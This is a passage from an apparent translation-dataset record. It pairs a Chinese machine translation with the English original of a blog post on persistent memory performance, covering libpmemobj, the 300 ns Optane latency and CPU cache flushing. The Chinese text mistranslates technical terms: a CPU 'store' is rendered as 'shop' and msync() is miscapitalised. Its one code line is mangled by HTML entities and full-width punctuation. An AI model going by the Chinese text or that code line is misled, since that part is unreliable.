\u4e48\u5b83\u5f88\u56f0\u96be\u7684\u6587\u7ae0\u3002\u6211\u7684\u7b2c\u4e00\u4e2a\u60f3\u6cd5\u662f\uff0c\u5b83\u771f\u7684\u4e0d\u662f\u8fd9\u6837\u7684\uff0c\u4f60\u5e94\u8be5\u9075\u5faa\u4f60\u5bf9\u6b63\u5e38\u7a0b\u5e8f\u6240\u9075\u5faa\u7684\u76f8\u540c\u7684\u8001\u5e38\u8bc6\u89c4\u5219\u3002\u6bd5\u7adf\u5b83\u53ea\u662f\u5185\u5b58\uff0c\u4f46\u5177\u6709\u66f4\u9ad8\u7684\u8bbf\u95ee\u5ef6\u8fdf\u3002\u4f46\u662f\uff0c\u5f53\u6211\u56de\u987elibpmemobj(\u6211\u4eec\u7684\u5185\u5b58\u5206\u914d\u5668\u548c\u4e8b\u52a1\u7cfb\u7edf)\u7684\u53d1\u5c55\u5386\u53f2\uff0c\u4ee5\u53ca\u81ea\u7b2c\u4e00\u4e2a\u7248\u672c\u4ee5\u6765\u6211\u4eec\u6240\u505a\u7684\u6027\u80fd\u6539\u8fdb\u65f6\uff0c\u6211\u7a81\u7136\u4e0d\u90a3\u4e48\u786e\u5b9a\u4e86\u3002\n\u6bd5\u7adf\uff0c\u5982\u679c\u4e3a\u6301\u4e45\u5316\u5185\u5b58\u7f16\u5199\u9ad8\u6027\u80fd\u4ee3\u7801\u5f88\u5bb9\u6613\uff0c\u6211\u4eec\u81f3\u5c11\u5728\u7b2c\u4e00\u6b21\u5c31\u4f1a\u5f97\u5230\u4e00\u4e9b\u6b63\u786e\u7684\u7ed3\u679c\u3002\u4e0d\u662f\u6211\u4eec\u5f53\u65f6\u60f3\u7684\u90a3\u4e48\u719f\u7ec3\uff0c\u5c31\u662f\u6211\u4eec\u5f53\u65f6\u6ca1\u6709\u90a3\u4e48\u719f\u7ec3\u3002\u8fd9\u5bf9\u6211\u6765\u8bf4\u80af\u5b9a\u4e0d\u662f\u8d85\u51fa\u4e86\u53ef\u80fd\u7684\u8303\u56f4\uff0c\u4f46\u6211\u7684\u56e2\u961f\u5176\u4ed6\u4eba\u5462\uff1f\u4ed6\u4eec\u7edd\u5bf9\u662f\u6709\u7d20\u8d28\u7684\u4eba\u3002\u6240\u4ee5\u2026\u3002\u4e3a\u4e86\u633d\u56de\u9762\u5b50\uff0c\u6211\u4eec\u4f1a\u5047\u8bbe\u6211\u7684\u7b2c\u4e00\u76f4\u89c9\u662f\u9519\u8bef\u7684\uff0c\u6bd5\u7adf\u5236\u4f5c\u6027\u80fd\u6301\u4e45\u8bb0\u5fc6\u4ee3\u7801\u662f\u5f88\u96be\u7684\u3002\n\u4ee5\u4e0b\u662f\u6211\u8bd5\u56fe\u89e3\u91ca\u4e3a\u4ec0\u4e48\u4f1a\u51fa\u73b0\u8fd9\u79cd\u60c5\u51b5\uff0c\u4ee5\u53ca\u6211\u4eec\u662f\u5982\u4f55\u5728\u5f00\u53d1libpmemobj\u7684\u8fc7\u7a0b\u4e2d\u8270\u96be\u5730\u83b7\u5f97\u8fd9\u4e00\u70b9\u7684\u3002\n\u4f46\u662f\uff0c\u5728\u6211\u4eec\u6df1\u5165\u4e86\u89e3\u6709\u5173\u6027\u80fd\u7684\u5177\u4f53\u7ec6\u8282\u4e4b\u524d\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u5b9a\u4e49\u4ec0\u4e48\u662f\u6301\u4e45\u6027\u5185\u5b58\u3002\u6211\u5e0c\u671b\u505a\u2026\u5f88\u5bb9\u6613\u3002\n\u6839\u636e\u4f60\u95ee\u7684\u662f\u8c01\uff0c\u4f60\u53ef\u80fd\u4f1a\u5f97\u5230\u4e0d\u540c\u7684\u7b54\u6848\u3002\u6211\u4eec\u901a\u5e38\u4f7f\u7528\u7684\u5bbd\u6cdb\u5b9a\u4e49\u662f\uff0c\u5b83\u662f\u975e\u6613\u5931\u6027\u7684\u5185\u5b58\uff0c\u5e76\u4e14\u5177\u6709\u8db3\u591f\u4f4e\u7684\u8bbf\u95ee\u5ef6\u8fdf\uff0c\u56e0\u6b64\u5728\u7b49\u5f85\u8bfb\u53d6\u6216\u5199\u5165\u5b8c\u6210\u65f6\u505c\u6b62CPU\u662f\u5408\u7406\u7684\u3002\n\u4f46\u662f\u8fd9\u4e2a\u5b9a\u4e49\u592a\u5bbd\u6cdb\u4e86\uff0c\u5982\u679c\u6211\u4eec\u53ea\u5728\u5b83\u7684\u9650\u5236\u8303\u56f4\u5185\u64cd\u4f5c\uff0c\u90a3\u4e48\u5173\u4e8e\u6027\u80fd\u7684\u8ba8\u8bba\u5c31\u4f1a\u76f8\u5f53\u80a4\u6d45\uff0c\u5e76\u4e14\u4ec5\u9650\u4e8e\u6301\u4e45\u5b58\u50a8\u5668\u7684\u975e\u6613\u5931\u6027\u65b9\u9762\u3002\u56de\u60f3\u8d77\u6765\uff0c\u8fd9\u662f\u6211\u4eec\u5728\u6700\u521d\u8bbe\u8ba1PMDK\u7684\u7b97\u6cd5\u548c\u6570\u636e\u7ed3\u6784\u65f6\u6240\u72af\u7684\u9519\u8bef\u4e4b\u4e00\u3002\u7a0d\u540e\u518d\u8bb2\u3002\n\u4e00\u4e2a\u66f4\u72ed\u9698\u7684\u7b54\u6848\u662f\uff0c\u6c38\u4e45\u5b58\u50a8\u5668\u53ef\u4ee5\u5b9a\u4e49\u4e3a\u4e00\u79cd\u65b0\u7684\u5b58\u50a8\u5668\u7c7b\u522b\uff0c\u6700\u597d\u7684\u7279\u5f81\u662fY\u516c\u53f8\u7684\u4ea7\u54c1X\u3002\u4f8b\u5982\uff0c\u5982\u679c\u60a8\u8981\u95ee\u6211\uff0c\u4e00\u4e2a\u4ed8\u8d39\u82f1\u7279\u5c14\u5148\u4ee4\uff0c\u8fd9\u79cd\u6c38\u4e45\u5b58\u50a8\u5668\u662f\u4ec0\u4e48\uff0c\u6211\u7684\u7b54\u6848\u662f\uff1a\u6211\u53ef\u4ee5\u8ba9\u60a8\u5bf9\u82f1\u7279\u5c14\u00ae\u7684\u65b0\u9769\u547d\u6027\u4ea7\u54c1\u82f1\u7279\u5c14\u00aeOptane\u2122DC Persistent Memory\u611f\u5174\u8da3\u5417\uff1f\u5f53\u7136\uff0c\u6211\u662f\u5f00\u73a9\u7b11\u7684\uff0c\u4f46\u6211\u7684\u89c2\u70b9\u662f\uff0c\u4e13\u6ce8\u4e8e\u4e00\u7c7b\u4ea7\u54c1\uff0c\u5982\u6b64\u7c7b\u4ea7\u54c1\u4e2d\u6700\u7a81\u51fa\u7684\u4f8b\u5b50\u6240\u8868\u5f81\u7684\u90a3\u6837\uff0c\u4f7f\u6211\u4eec\u80fd\u591f\u62e5\u6709\u591a\u79cd\n\u8fd9\u5c31\u662f\u6211\u4eec\u6700\u7ec8\u5f97\u51fa\u8fd9\u7bc7\u5e16\u5b50\u6807\u9898\u4e2d\u7684\u6570\u5b57\u7684\u539f\u56e0\u3002\u82f1\u7279\u5c14\u65b0\u7684\u6c38\u4e45\u5b58\u50a8\u8bbe\u5907\u7684\u4e00\u4e2a\u66f4\u91cd\u8981\u7684\u7279\u70b9\u662f\u5b83\u7684\u5e73\u5747\u8bbf\u95ee\u5ef6\u8fdf\u3002300\u7eb3\u79d2\u3002\n\u4f46\u5728\u6211\u4eec\u628a\u5b83\u653e\u5728\u4e0a\u4e0b\u6587\u4e2d\u4e4b\u524d\uff0c\u8fd9\u4e2a\u6570\u5b57\u672c\u8eab\u5e76\u6ca1\u6709\u591a\u5927\u610f\u4e49\u3002\n\u90a3\u4e48\uff0c300\u7eb3\u79d2\u7684\u5ef6\u8fdf\u5feb\u5417\uff1f\u5bf9\u4e8e\u5b58\u50a8\u6765\u8bf4\uff0c\u5b83\u7edd\u5bf9\u662f\u5982\u6b64\uff0c\u4ece\u5b57\u9762\u4e0a\u8bb2\uff0c\u5b83\u6bd4\u4efb\u4f55\u5176\u4ed6\u6280\u672f\u90fd\u8981\u5feb\u51e0\u4e2a\u6570\u91cf\u7ea7\u3002\u4f46\u662f\u4e3a\u4e86\u8bb0\u5fc6\u5462\uff1f\u4e0d\u5b8c\u5168\u662f\u3002\u5b83\u7684\u901f\u5ea6\u7edd\u5bf9\u8db3\u591f\u5feb\uff0c\u53ef\u4ee5\u88ab\u8ba4\u4e3a\u662f\u5185\u5b58\uff0c\u4f46\u5c31\u6570\u636e\u7ed3\u6784\u8bbe\u8ba1\u800c\u8a00\uff0c\u5b83\u4e5f\u4e0d\u591f\u5feb\uff0c\u4e0d\u80fd\u50cf\u666e\u901a\u7684DRAM\u90a3\u6837\u5bf9\u5f85\u3002\u7279\u522b\u662f\u5f53\u6211\u4eec\u8003\u8651\u6301\u4e45\u5b58\u50a8\u5668\u7f16\u7a0b\u6a21\u578b\u7684\u66f4\u5e7f\u6cdb\u7684\u65b9\u9762\u65f6\u3002\n\u6301\u4e45\u8bb0\u5fc6\u5c31\u50cf\u5149\u4e00\u6837\uff0c\u201c\u6211\u4eec\u6709\u4e24\u5e45\u76f8\u4e92\u77db\u76fe\u7684\u73b0\u5b9e\u56fe\u666f\u201d\uff0c\u5b83\u4e0d\u80fd\u7b80\u5355\u5730\u7528\u8bb0\u5fc6\u6216\u5b58\u50a8\u6765\u63cf\u8ff0\uff0c\u56e0\u4e3a\u8fd9\u4e24\u4e2a\u672f\u8bed\u90fd\u4e0d\u80fd\u5b8c\u5168\u89e3\u91ca\u8fd9\u4e2a\u65b0\u7684\u5c42\u6b21\u3002\n\u5c31\u50cf\u5b58\u50a8\u4e00\u6837\uff0c\u5b83\u53ef\u4ee5\u901a\u8fc7\u6b63\u5e38\u7684\u6587\u4ef6I/O\u64cd\u4f5c(\u5982read()\u6216write())\u8fdb\u884c\u8bbf\u95ee\uff0c\u5e76\u4e14\u5c31\u50cf\u5185\u5b58\u4e00\u6837\uff0c\u53ef\u4ee5\u901a\u8fc7\u5185\u5b58\u6620\u5c04I/O\u5728\u5b57\u8282\u7ea7\u522b\u76f4\u63a5\u8bbf\u95ee\u5b83\uff0c\u800c\u4e0d\u9700\u8981\u4ecb\u5165\u9875\u9762\u7f13\u5b58\u5c42\u3002\n\u800c\u4e14\uff0c\u5c31\u50cf\u4f7f\u7528\u5b58\u50a8\u4e00\u6837\uff0c\u5e94\u7528\u7a0b\u5e8f\u9700\u8981\u4ee5\u67d0\u79cd\u65b9\u5f0f\u5c06\u5176\u5199\u5165PMEM\u7684\u5185\u5bb9\u4e0e\u4ecb\u8d28\u540c\u6b65\uff0c\u5c31\u50cf\u60a8\u53d1\u51fafsync()\u6216msync()\u6765\u786e\u4fddI/O\u4e00\u76f4\u5230\u8fbe\u5b58\u50a8\u8bbe\u5907\u4e00\u6837\u3002\u4e8b\u5b9e\u4e0a\uff0c\u8fd9\u4e24\u4e2a\u8c03\u7528\u4e5f\u786e\u5b9e\u53ef\u4ee5\u5b9e\u73b0\u6301\u4e45\u5185\u5b58-\u4f46\u8fd8\u6709\u66f4\u597d\u7684\u65b9\u6cd5\u3002\n\u8ba9\u6211\u4eec\u5148\u5012\u56de\u4e00\u70b9\u3002\u6211\u4e4b\u524d\u544a\u8bc9\u8fc7\u60a8\uff0c\u6c38\u4e45\u5185\u5b58\u662f\u975e\u6613\u5931\u6027\u7684\uff0c\u60a8\u53ef\u4ee5\u76f4\u63a5\u5199\u5165\u3002\u90a3\u4e48\uff0c\u6211\u4eec\u7a76\u7adf\u4e3a\u4ec0\u4e48\u9700\u8981\u8d39\u5fc3\u540c\u6b65I/O\u5462\uff1f\u55ef\uff0c\u51fa\u4e8e\u540c\u6837\u7684\u539f\u56e0\uff0c\u6211\u4eec\u5bf9\u5e38\u89c4\u5b58\u50a8\u8bbe\u5907\u4e5f\u662f\u8fd9\u6837\u505a\u7684\u3002\u4ece\u5e94\u7528\u7a0b\u5e8f\u5230DIMM\u7684\u6574\u4e2a\u5b58\u50a8\u8fc7\u7a0b\u4e2d\u90fd\u6709\u5404\u79cd\u7f13\u5b58\u548c\u7f13\u51b2\u533a\u3002\u6700\u91cd\u8981\u7684\u662f\uff0c\u8fd9\u91cc\u6709CPU\u7f13\u5b58\u3002\n\u5f53\u4e00\u4e2a\u5546\u5e97\u5230\u8fbe\u5e73\u53f0\u7684\u6301\u4e45\u57df\u65f6\uff0c\u6211\u4eec\u8ba4\u4e3a\u5b83\u662f\u6301\u4e45\u7684\u3002\u9a7b\u7559\u5728\u6301\u4e45\u57df\u4e2d\u7684\u7ec4\u4ef6\u4e2d\u7684\u6240\u6709\u5b58\u50a8\u90fd\u80fd\u786e\u4fdd\u5230\u8fbeDIMM\uff0c\u5373\u4f7f\u5728\u51fa\u73b0\u6545\u969c\u7684\u60c5\u51b5\u4e0b\u4e5f\u662f\u5982\u6b64\uff0c\u9664\u975e\u51fa\u73b0\u4e00\u4e9b\u707e\u96be\u6027\u7684\u786c\u4ef6\u95ee\u9898\u3002\n\u7b80\u800c\u8a00\u4e4b\uff0c\u5728\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd9\u610f\u5473\u7740\u5e94\u7528\u7a0b\u5e8f\u9700\u8981\u5c06\u5b58\u50a8\u4eceCPU\u7f13\u5b58\u4e2d\u6e05\u9664\u51fa\u6765\uff0c\u7136\u540e\u624d\u80fd\u5c06\u5176\u89c6\u4e3a\u6301\u4e45\u5316\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528mSync()\u6765\u505a\u8fd9\u4ef6\u4e8b\uff0c\u5185\u6838\u4f1a\u505a\u6b63\u786e\u7684\u4e8b\u60c5\uff0c\u4f46\u662f\u60a8\u4e5f\u53ef\u4ee5\u4f7f\u7528\u7528\u6237\u7a7a\u95f4\u6307\u4ee4\u76f4\u63a5\u5237\u65b0CPU\u7f13\u5b58\uff0c\u8fd9\u6709\u4e24\u4e2a\u539f\u56e0\uff1aa)\u4e0d\u9700\u8981\u6602\u8d35\u7684syscall\uff1bb)\u53ef\u4ee5\u4f7f\u7528\u7f13\u5b58\u884c\u7c92\u5ea6(\u800c\u4e0d\u662f\u9875\u9762\u7c92\u5ea6)\u5237\u65b0\u6570\u636e\u3002\n\u54e6\uff0c\u5728x86-64\u4e0a\uff0c\u7f13\u5b58\u7ebf\u662f64\u5b57\u8282\uff0c\u8fd9\u610f\u5473\u7740\u5c0f\u4e8e64\u5b57\u8282\u7684\u5b58\u50a8\u5728\u5199\u5165DIMM\u65f6\u4f1a\u5f15\u8d77\u4e00\u4e9b\u5199\u5165\u653e\u5927\u3002\n\u603b\u800c\u8a00\u4e4b\uff0c\u6301\u4e45\u6027\u5185\u5b58\u786e\u5b9e\u662f\u975e\u6613\u5931\u6027\u7684\uff0c\u4f46\u662f\u9700\u8981\u5c06\u5b58\u50a8\u4eceCPU\u7f13\u5b58\u4e2d\u6e05\u9664\u51fa\u6765\uff0c\u7406\u60f3\u60c5\u51b5\u4e0b\u662f\u5728\u5355\u4e2a\u7f13\u5b58\u7ebf\u4e0a\u4f7f\u7528\u7528\u6237\u7a7a\u95f4\u6307\u4ee4\u3002\n\u4f46\u662f\u2026\u3002(\u4f3c\u4e4e\u603b\u662f\u6709\u4e00\u4e2aBUT)\u7f13\u5b58\u5237\u65b0\u6307\u4ee4\u5c06\u884c\u4ece\u7f13\u5b58\u4e2d\u9010\u51fa\u3002\u8fd9\u610f\u5473\u7740\u5728\u5199\u5165\u540e\u7acb\u5373\u8bfb\u53d6\u67d0\u4e9b\u5185\u5bb9\u4f1a\u5bfc\u81f4\u7f13\u5b58\u672a\u547d\u4e2d-\u9700\u8981CPU\u4eceDIMM\u83b7\u53d6\u6570\u636e\u3002\u800c\u4e14\uff0c\u8fd9\u8fd8\u4e0d\u662f\u5168\u90e8\u3002\u5373\u4f7f\u5728\u5237\u65b0\u540e\u5728\u540c\u4e00\u9ad8\u901f\u7f13\u5b58\u7ebf\u4e2d\u518d\u6b21\u5199\u5165\u67d0\u4e9b\u5185\u5bb9\uff0c\u901a\u5e38\u4e5f\u4f1a\u5bfc\u81f4\u7f13\u5b58\u672a\u547d\u4e2d\uff0c\u4ece\u800c\u4f7f\u5b58\u50a8\u6210\u672c\u7ffb\u500d\u3002\n\u9664\u975e\u60a8\u60f3\u521b\u5efa\u4e00\u4e9b\u771f\u6b63\u6301\u4e45\u7684\u6570\u636e\u7ed3\u6784\uff0c\u5426\u5219\u6240\u6709\u8fd9\u4e9b\u90fd\u65e0\u5173\u7d27\u8981\u3002\u6211\u6240\u8bf4\u7684\u6301\u4e45\u6027\u6307\u7684\u662f\u5bff\u547d\u6bd4\u521b\u5efa\u5b83\u7684\u8fdb\u7a0b\u7684\u5bff\u547d\u66f4\u957f\u7684\u6570\u636e\u7ed3\u6784\u3002\u4f46\u662f\uff0c\u8be5\u5b9a\u4e49\u4e5f\u5c06\u5305\u62ec\u5728\u8fdb\u7a0b\u9000\u51fa\u65f6\u5e8f\u5217\u5316\u7684\u6570\u636e\u7ed3\u6784\uff0c\u8fd9\u4e00\u4f17\u6240\u5468\u77e5\u7684\u65b9\u6cd5\u4e0d\u5728\u672c\u6587\u7684\u2026\u8ba8\u8bba\u8303\u56f4\u4e4b\u5185\u3002\u56e0\u6b64\uff0c\u8ba9\u6211\u4eec\u5c06\u7126\u70b9\u7f29\u5c0f\u5230\u6bd4\u8fdb\u7a0b\u5bff\u547d\u66f4\u957f\u4e14\u5373\u4f7f\u51fa\u73b0\u6545\u969c\u4e5f\u59cb\u7ec8\u4fdd\u6301\u4e00\u81f4\u7684\u6570\u636e\u7ed3\u6784\u3002\u6211\u4eec\u901a\u5e38\u8bf4\u8fd9\u6837\u7684\u6570\u636e\u7ed3\u6784\u662f\u5931\u6548\u539f\u5b50\u7684\u3002\n\u8fd9\u542c\u8d77\u6765\u4e0e\u5e76\u53d1(\u539f\u5b50)\u6570\u636e\u7ed3\u6784\u60ca\u4eba\u5730\u76f8\u4f3c\uff0c\u4e0d\u662f\u5417\uff1f\u53ea\u9700\u5c06\u201c\u8fdb\u7a0b\u201d\u66ff\u6362\u4e3a\u201c\u7ebf\u7a0b\u201d\uff0c\u5c06\u201c\u5931\u8d25\u201d\u66ff\u6362\u4e3a\u201c\u62a2\u5360\u201d\u3002\u8fd9\u4e00\u89c2\u5bdf\u7ed3\u679c\u662f\u5b66\u672f\u754c\u548c\u4ea7\u4e1a\u754c\u56f4\u7ed5\u6301\u4e45\u8bb0\u5fc6\u7684\u8bb8\u591a\u60f3\u6cd5\u7684\u57fa\u7840\u3002\u4e3a\u4e86\u63d0\u51fa\u9ad8\u6548\u7684\u7b97\u6cd5\uff0c\u6211\u4eec\uff0cPMDK\u56e2\u961f\uff0c\u4e00\u76f4\u5728\u5927\u91cf\u5229\u7528\u4e3a\u5e76\u53d1\u7f16\u7a0b\u6240\u505a\u7684\u5927\u91cf\u5de5\u4f5c\u3002\nfoo-&gt\uff1bbar=10\uff1b.FETCH_AND_ADD(&amp\uff1bfoo-&gt\uff1bbar\uff0c5)\uff1b/*Visible=15\uff0cPersistent on DIMM=\uff1f(10\u621615)*/Persistent(&amp\uff1bFoo-&gt\uff1bbar)\uff1b/*Visible=15\uff0cPersistent on DIMM=15*/\u3002\n\u76f4\u63a5\u4f7f\u7528\u5e76\u53d1\u6570\u636e\u7ed3\u6784\u6765\u5b9e\u73b0\u6545\u969c\u539f\u5b50\u6027\u7684\u4e00\u4e2a\u95ee\u9898\u662f\u53ef\u89c1\u6027\u548c\u6301\u4e45\u6027\u4e4b\u95f4\u7684\u533a\u522b\uff0c\u5e76\u53d1\u6570\u636e\u7ed3\u6784\u5fc5\u987b\u4fdd\u8bc1\u6240\u6709\u6267\u884c\u7ebf\u7a0b\u59cb\u7ec8\u4fdd\u6301\u4e00\u81f4\u7684\u72b6\u6001\u3002\u4f46\u662f\uff0c\u6301\u4e45\u5316\u8fdb\u7a0b\u8fd8\u5fc5\u987b\u786e\u4fdd\u5728\u5141\u8bb8\u5176\u4ed6\u8fdb\u7a0b\u6216\u7ebf\u7a0b\u57fa\u4e8e\u7ed3\u6784\u7684\u72b6\u6001\u505a\u51fa\u4efb\u4f55\u51b3\u7b56\u4e4b\u524d\uff0c\u6570\u636e\u5b58\u5728\u4e8e\u6301\u4e45\u57df\u4e2d\u3002\u6b63\u786e\u5730\u6267\u884c\u6b64\u64cd\u4f5c\u5bf9\u4e8e\u6027\u80fd\u81f3\u5173\u91cd\u8981\u3002\n\u6bcf\u6b21\u5c06\u5143\u7d20\u63d2\u5165\u5230\u94fe\u8868\u4e2d\u65f6\uff0c\u90fd\u9700\u8981\uff1a\n\u8981\u4ee5\u5e76\u53d1\u7684\u65b9\u5f0f\u505a\u5230\u8fd9\u4e00\u70b9\uff0c\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5730\u7528\u67d0\u79cd\u7c7b\u578b\u7684\u9501\u6765\u5305\u56f4\u8fd9\u4e9b\u64cd\u4f5c\uff0c\u4ee5\u9632\u6b62\u5176\u4ed6\u7ebf\u7a0b\u5728\u63d2\u5165\u8fc7\u7a0b\u4e2d\u8bbf\u95ee\u5217\u8868\u3002\u5bf9\u4e8e\u559c\u6b22\u5192\u9669\u7684\u4eba\u6765\u8bf4\uff0c\u7f16\u5199\u4e00\u4e2a\u65e0\u9501\u7b97\u6cd5\u4e5f\u662f\u4e00\u79cd\u9009\u62e9\uff0c\u56e0\u4e3a\u5b83\u53ef\u80fd\u4f1a\u6709\u66f4\u597d\u7684\u4f38\u7f29\u6027\u3002\n\u7136\u800c\uff0c\u8ba9\u5b83\u6210\u4e3a\u539f\u5b50\u6545\u969c\u9700\u8981\u6211\u4eec\u56de\u7b54\u51e0\u4e2a\u57fa\u672c\u95ee\u9898\u3002\u5206\u914d\u5185\u5b58\u610f\u5473\u7740\u4ec0\u4e48\u5462\uff1f\u5806\u672c\u8eab\u9700\u8981\u6301\u4e45\u5316\u3002\u5f53\u7a0b\u5e8f\u4e2d\u65ad\u65f6\uff0c\u6211\u4eec\u5fc5\u987b\u786e\u4fdd\u5206\u914d\u7684\u5bf9\u8c61\u4e0d\u4f1a\u6cc4\u6f0f\u3002\u5806\u6bd5\u7adf\u662f\u6301\u4e45\u7684\u3002\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5c06\u5982\u4f55\u4ee5\u6545\u969c\u4fdd\u62a4\u539f\u5b50\u7684\u65b9\u5f0f\u5bf9\u591a\u4e2a\u4e92\u4e0d\u76f8\u4ea4\u7684\u5185\u5b58\u4f4d\u7f6e\u8fdb\u884c\u66f4\u6539\uff1f\u8fd9\u4e0d\u662f\u5728\u6211\u4eec\u4fee\u6539\u6570\u636e\u7ed3\u6784\u65f6\u963b\u6b62\u5176\u4ed6\u8fdb\u7a0b\u67e5\u770b\u5b83\u90a3\u4e48\u7b80\u5355\u3002\u6211\u4eec\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u6267\u884c\u73af\u5883\u968f\u65f6\u53ef\u80fd\u88ab\u6b8b\u5fcd\u5730\u6740\u6b7b\uff0c\u8feb\u4f7f\u9644\u52a0\u5230\u540c\u4e00\u6301\u4e45\u5185\u5b58\u533a\u57df\u7684\u4e0b\u4e00\u4e2a\u8fdb\u7a0b\u4ee5\u67d0\u79cd\u65b9\u5f0f\u5904\u7406\u4e2d\u65ad\u7684\u64cd\u4f5c\u3002\u6700\u540e\uff0c\u6211\u4eec\u5fc5\u987b\u95ee\u95ee\u81ea\u5df1\uff0c\u8fd9\u662f\u5426\u771f\u7684\u662f\u6211\u4eec\u60f3\u8981\u505a\u7684\uff1f\u521b\u5efa\u6301\u4e45\u7684\u53cc\u5411\u94fe\u8868\u662f\u76ee\u6807\u5417\uff1f\u6839\u636e\u6211\u7684\u7ecf\u9a8c\uff0c\u521b\u5efa\u6570\u636e\u7ed3\u6784\u6216\u7b97\u6cd5\u53ea\u662f\u8fbe\u5230\u76ee\u7684\u7684\u4e00\u79cd\u624b\u6bb5\u3002\u4e00\u65e6\u6211\u4eec\u7a0d\u5fae\u6539\u53d8\u4e86\u6211\u4eec\u5bf9\u8bb0\u5fc6\u7684\u5047\u8bbe\uff0c\u91cd\u65b0\u8003\u8651\u6211\u4eec\u6700\u521d\u53ea\u4f7f\u7528\u6211\u4eec\u6240\u77e5\u9053\u7684\u4e1c\u897f\u7684\u672c\u80fd\u53ef\u80fd\u4f1a\u66f4\u6709\u610f\u4e49\u3002\n\u56de\u60f3\u8d77\u6765\uff0c\u5bf9\u4e8elibpmemobj\uff0c\u6211\u4eec\u9519\u8bef\u5730\u56de\u7b54\u4e86\u524d\u4e24\u4e2a\u95ee\u9898\uff0c\u751a\u81f3\u6ca1\u6709\u95ee\u5230\u7b2c\u4e09\u4e2a\u95ee\u9898\u3002\n\u6709\u4e86\u8fd9\u4e2a\uff0c\u6211\u5c06\u8ba9\u60a8\u601d\u8003\uff0c\u76f4\u5230\u5047\u671f\u7ed3\u675f\uff1a)\u3002\n\u5728\u8fd9\u7bc7\u6587\u7ae0\u4e2d\uff0c\u6211\u4eec\u4e86\u89e3\u4e86\u4ec0\u4e48\u662f\u6301\u4e45\u5185\u5b58\u4ee5\u53ca\u5982\u4f55\u4f7f\u7528\u5b83\uff0c\u6211\u4eec\u8fd8\u8ba8\u8bba\u4e86\u6301\u4e45\u6570\u636e\u7ed3\u6784\u610f\u5473\u7740\u4ec0\u4e48\uff0c\u4ee5\u53ca\u8fd9\u53ef\u80fd\u5982\u4f55\u5f71\u54cd\u6027\u80fd\u3002\n\u5728\u4e0b\u4e00\u90e8\u5206\uff0c\u6211\u4eec\u5c06\u66f4\u6df1\u5165\u5730\u7814\u7a76\u6211\u5bf9\u6211\u63d0\u51fa\u7684\u4e09\u4e2a\u95ee\u9898\u7684\u56de\u7b54\uff0c\u4ee5\u53ca\u6211\u4eec\u662f\u5982\u4f55\u57fa\u4e8e\u91cd\u65b0\u8003\u8651\u4e86\u5173\u4e8e\u6301\u4e45\u8bb0\u5fc6\u7684\u6700\u521d\u5047\u8bbe\u540e\u8fdb\u884c\u7684\u81ea\u6211\u53cd\u601d\u6765\u6539\u8fdb\u6211\u4eec\u7684\u5e93\u7684\u3002", "note_en": "Educating people has always been a challenge for me. I tend to skip over thingsI wrongly consider obvious, or do large leaps in reasoning when explaining asolution to a problem. And so, when faced with an attempt to explain a complextopic, I tend to ramble on and on, hoping that the audience knows when to interruptme if I go too fast. However, this doesn\u2019t hold true for blog posts, such as the one I\u2019mcurrently writing. This is why I have a request to you, the reader,please do let me know if I went too fast on this one - thanks!\n So, why did I write this seemingly off-topic preamble? I\u2019ve been trying to createa write up about performance in persistent memory programming and why it\u2019s difficult.And my immediate thought was that it really is not and you should just followthe same old common sense rules you would for normal programs. It is just memoryafter all, but with higher access latency. But then, when I look back at thedevelopment history of libpmemobj, our memory allocator and transaction system,and the performance improvements we\u2019ve made since the first version, I\u2019msuddenly not so sure.\n  After all, if writing high-performance code for persistent memory were easy,we\u2019d get it at least somewhat right the first time around. It\u2019s either thator we were not as skilled as we thought we were back then. That\u2019s certainlynot beyond the realms of possibility for me, but the rest of my team? They aredefinitely quality folks. So\u2026 at an attempt to save face, we will operate onthe assumption that my first instinct was wrong, and that crafting performantpersistent memory code is hard after all.\n What follows is my attempt at explaining why that is the case and how we\u2019velearned that the hard way during development of libpmemobj.\n  But before we dive into the nitty-gritty details around performance, we firstneed to define what persistent memory is. I wish it were easy to do\u2026\n Depending on who you ask, you might get a different answer. The broadestdefinition that we commonly use is that it\u2019s memory that is non-volatile and hasaccess latency low enough that it is reasonable to stall the CPU while waitingfor reads or writes to complete.\n But that definition is so broad that, if we were to operate only within itsconstraints, it would make discussions around performance rather shallow andlimited to the non-volatile aspect of persistent memory.In retrospect, this is one of the mistakes we\u2019ve made when first designing thealgorithms and data structures for PMDK. More on that later.\n A more narrow answer is that persistent memory can be defined as a new class ofmemories, best characterized by a product X from company Y.For example, if you were to ask me, a paid Intel shill, what is thispersistent memory thing, my answer would have to be: May I interest you inIntel\u00ae\u2019s new revolutionary product, Intel\u00ae Optane\u2122 DC Persistent Memory?I jest, of course, but it is my opinion that focusing on one category ofproducts, as characterized by the most prominent example from such category,enables us to have a multidimensional discussion that captures more aspectsof a given problem.\n And this is how we finally get to the number in the title of this post. One ofthe more important characteristics of Intel\u2019s new Persistent Memory devices isits average access latency. 300 nanoseconds.\n  But that number alone doesn\u2019t mean much until we put it in context.\n  So, is 300 nanoseconds latency fast? For storage it definitely is, literallyorders of magnitude faster than any other technology. But for memory? Not really.It\u2019s definitely fast enough to be considered memory, but it\u2019s also not fastenough to be treated just like normal DRAM as far as data structure design isconcerned. Especially when we consider the broader aspects of the Persistent Memory Programming Model.\n  With persistent memory, just like with light, \u201cwe have two contradictory pictures of reality\u201d.It cannot be simply described as memory or storage, because neither of thoseterms fully explains this new tier.\n Just like with storage, it can be accessed through normal  File I/O operationssuch as  read() or  write(), and just like with memory, it can be accessed directlyat the byte level through  Memory Mapped I/O, without an intervening page-cache layer.\n And, just like with storage, the application needs to somehow synchronizewhat it wrote to PMEM with the media, just like you\u2019d issue  fsync() or msync() to make sure that your I/O made it all the way to storage device.In fact, those two calls do exactly that also for persistent memory - but there\u2019sa better way.\n  Let\u2019s rewind a little first. I previously told you that persistent memory isnon-volatile and you can write to it directly. So why exactly do we need tobother with synchronizing the I/O? Well, for the same reason we do it for regularstorage devices. There are various caches and buffers along the way of a storefrom the application to the DIMM. Most importantly, there\u2019s the CPU cache.\n We consider a store to be persistent when it reaches the persistent domain ofthe platform. All stores that reside in the components that are within thepersistent domain are ensured to reach the DIMM, even in case of failures,barring some catastrophic hardware problems.\n To cut a long story short, in the common case this means that applications need topush stores out of the CPU cache before it can be considered persistent.You can do that with an  msync() and the kernel will do the right thing,but you also directly flush the CPU cache using user-space instructions, whichis 